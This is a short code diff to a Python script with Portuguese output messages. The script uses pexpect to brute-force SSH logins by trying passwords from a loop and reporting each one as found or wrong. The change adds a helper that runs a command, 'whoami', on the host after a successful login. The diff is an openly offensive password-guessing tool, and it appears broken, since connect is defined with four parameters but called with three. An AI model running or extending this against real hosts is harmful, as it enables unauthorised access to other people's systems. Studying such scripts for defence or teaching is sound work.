@@ -2,6 +2,12 @@
 
 import pexpect;
 PROMPT = ['#','>>','>','\$'];
+
+def send_command(child,command):
+  child.sendline(command);
+  child.expect(PROMPT);
+  print(child.before);
+
 def connect(user,host,password,PROMPT):
   ssh_newkey = ('Você deseja continuar conectado?');
   connStr = ('ssh', user, '@', host);
@@ -28,7 +34,8 @@ def main():
     print(password);
     try:
       child = connect(user,host,password);
-      print('[+] Senha Encontrada:' + password);
+      print('[+] Senha Encontrada:',password);
+      send_command(child,'whoami');
     except:
-        print('[-] Senha Errada:' + password);
+        print('[-] Senha Errada:', password);
 main();
